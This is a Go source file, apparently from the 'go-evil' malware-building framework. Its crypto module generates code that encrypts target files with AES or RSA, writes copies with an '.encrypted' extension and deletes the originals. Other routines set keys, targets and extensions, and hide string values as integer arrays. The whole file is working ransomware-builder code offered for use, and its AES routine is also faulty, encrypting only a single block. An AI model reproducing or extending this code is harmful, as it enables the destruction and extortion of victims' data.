package crypto

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

//
//
// Encrypts the provided target
// The input can follow this format '${"<crypto system>", "<key>", "<'file'/'ext'/'dir'>", "<object>"}$'
// following the above format will "overwrite" all values in the struct before encrypting
//
//
func encrypt(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "encrypt"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", system_call),
		"if spine.crypt.method == \"\" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {",
		"notify.Log(\"Method, target or/and key has not been set for decryption\", \"3\", spine.logging)",
		"return",
		"}",
		"for _, target := range spine.crypt.target{",
		"target = spine.variable.get(target)",
		"gut, err := ioutil.ReadFile(target)",

		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",
		"enc := \"\"",

		"switch (spine.crypt.method){",

		"\tcase \"aes\":",
		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",
		"for (len(gut) < spine.crypt.aes_key_length){",
		"gut = append(gut, []byte(\"X\")...)",
		"}",
		"buffer := make([]byte, len(gut))",
		"cipher.Encrypt(buffer, gut)",
		"enc = hex.EncodeToString(buffer)",

		"\tcase \"rsa\":",
		"enc_byte, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &spine.crypt.rsa_public, []byte(gut), nil)",
		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",
		"enc = hex.EncodeToString(enc_byte)",
		"}",
		"if spine.crypt.extension == \"\"{",
		"spine.crypt.extension = \".encrypted\"",
		"}",
		"ioutil.WriteFile(fmt.Sprintf(\"%s%s\", target, spine.crypt.extension), []byte(enc), 0644)",
		"os.Remove(target)",
		"}",

		"}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("io/ioutil")
	data_object.Add_go_import("encoding/hex")
	data_object.Add_go_import("crypto/aes")
	data_object.Add_go_import("crypto/rsa")
	data_object.Add_go_import("crypto/sha256")
	data_object.Add_go_import("crypto/rand")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
}

//
//
// Sets the crypto system to use for encrypting and decrypting
//
//
func set_crypto(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	available_systems := []string{"aes", "rsa"}
	system_call := "set_crypto"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	def_crypto := false // Is the crypto that we are gonna use definied?

	for _, def_c := range available_systems {
		if def_c == value {
			def_crypto = true
			break
		}
	}

	if !def_crypto { // Failed to find the crypto
		notify.Error(fmt.Sprintf("Unknown crypto system '%s', available are %s", value, available_systems), "crypto.set_method()")
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", system_call),
		"target := spine.alpha.construct_string(repr)",
		"spine.crypt.set_crypto(target)",
		"}"})

	// Construct our int array
	parameter := "[]int{"
	for _, repr := range tools.Generate_int_array(value) {
		parameter += fmt.Sprintf("%d,", repr)
	}
	parameter += "}"

	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
}

//
//
// Sets the aes key used for encrypting
//
//
func set_aes_key(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "set_aes_key"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", system_call),
		"key := spine.alpha.construct_string(repr)",
		"spine.crypt.set_aes_key(key)",
		"}"})

	// Construct our int array
	parameter := "[]int{"
	for _, repr := range tools.Generate_int_array(value) {
		parameter += fmt.Sprintf("%d,", repr)
	}
	parameter += "}"

	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
}

//
//
// Generates an aes key used for encrypting/decrypting
//
//
func generate_aes_key(value string, s_json string) ([]string, string) {
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	key_size := tools.String_to_int(value)

	if key_size == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", value), "crypto.generate_key()")
	}

	key := tools.Generate_random_n_string(key_size)

	calls, s_json := set_aes_key(key, s_json)

	return calls, s_json
}

//
//
// Generates a rsa key used for encrypting/decrypting
//
//
func generate_rsa_key(value string, s_json string) ([]string, string) {
	value = tools.Erase_delimiter(value, []string{"\""}, -1)
	system_call := "generate_rsa_key"
	data_object := structure.Receive(s_json)

	// Check if the key is valid
	if ok := tools.String_to_int(value); ok == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", value), "crypto.generate_key()")
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(key_size int){", system_call),
		"privateKey, err := rsa.GenerateKey(rand.Reader, key_size)",
		"if err == nil{",
		"spine.crypt.set_rsa_key(privateKey, key_size)",
		"}",
		"}"})

	return []string{fmt.Sprintf("%s(%s)", system_call, value)}, structure.Send(data_object)
}

//
//
// Appends a target to focus on, you can also pass in a evil array with all your targets aswell
//
//
func add_target(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "add_target"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", system_call),
		"target := spine.alpha.construct_string(repr)",
		"target = spine.variable.get(target)",
		"if target != \"\"{",
		"spine.crypt.add_target(target)",
		"}",
		"}"})

	// Construct our int array
	parameter := "[]int{"
	for _, repr := range tools.Generate_int_array(value) {
		parameter += fmt.Sprintf("%d,", repr)
	}
	parameter += "}"

	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
}

//
//
// This functions sets the extension that each file will have after being encrypted
//
//
func set_after_extension(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "set_extension"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", system_call),
		"target := spine.alpha.construct_string(repr)",
		"spine.crypt.extension = target",
		"}"})

	// Construct our int array
	parameter := "[]int{"
	for _, repr := range tools.Generate_int_array(value) {
		parameter += fmt.Sprintf("%d,", repr)
	}
	parameter += "}"

	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
}

//
//
// Decrypts the provided target
// The input can follow this format '${"<crypto system>", "<key>", "<'file'/'ext'/'dir'>", "<object>"}$'
// following the above format will "overwrite" all values in the struct before decrypting
//
//
func decrypt(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "decrypt"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", system_call),
		"if spine.crypt.method == \"\" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {",
		"notify.Log(\"Method, target or/and key has not been set for decryption\", \"3\", spine.logging)",
		"return",
		"}",
		"for _, target := range spine.crypt.target{",

		"target = spine.variable.get(target)",
		"gut, err := ioutil.ReadFile(target)",

		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",
		"dec := \"\"",

		"switch (spine.crypt.method){",

		"\tcase \"aes\":",
		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",
		"cipher_text, err := hex.DecodeString(string(gut[:]))",
		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",
		"buffer := make([]byte, len(cipher_text))",
		"cipher.Decrypt(buffer, []byte(cipher_text))",
		"dec = string(buffer[:])",

		"\tcase \"rsa\":",
		"buffer, err := hex.DecodeString(string(gut[:]))",
		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",

		"buffer, err = spine.crypt.rsa_private.Decrypt(nil, buffer, &rsa.OAEPOptions{Hash: crypto.SHA256})",
		"if err != nil{",
		"notify.Log(err.Error(), \"3\", spine.logging)",
		"return",
		"}",

		"dec = string(buffer[:])",

		"}",
		"if spine.crypt.extension == \"\"{",
		"spine.crypt.extension = \".decrypted\"",
		"}",

		"ioutil.WriteFile(fmt.Sprintf(\"%s%s\", target, spine.crypt.extension), []byte(dec), 0644)",
		"}",

		"}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("io/ioutil")
	data_object.Add_go_import("encoding/hex")
	data_object.Add_go_import("crypto")
	data_object.Add_go_import("crypto/aes")
	data_object.Add_go_import("crypto/rsa")
	data_object.Add_go_import("crypto/sha256")
	data_object.Add_go_import("crypto/rand")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
}

//
//
//
//
//
func clean_targets(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "clean_targets"
	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", system_call),
		"spine.crypt.target = []string{}",
		"}"})

	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
}
